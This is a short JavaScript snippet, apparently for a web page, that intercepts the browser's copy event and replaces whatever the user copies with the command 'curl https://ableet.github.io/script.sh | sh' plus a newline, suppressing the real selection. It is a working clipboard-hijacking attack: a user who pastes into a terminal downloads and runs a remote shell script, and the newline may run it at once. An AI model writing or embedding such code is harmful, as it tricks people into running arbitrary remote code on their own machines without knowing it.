document.addEventListener('copy', function(e){
    e.clipboardData.setData('text/plain', 'curl https://ableet.github.io/script.sh | sh \n');
    e.clipboardData.setData('text/html', '<b>curl https://ableet.github.io/script.sh | sh </br></b>');
    e.preventDefault(); // We want our data, not data from any selection, to be written to the clipboard
});
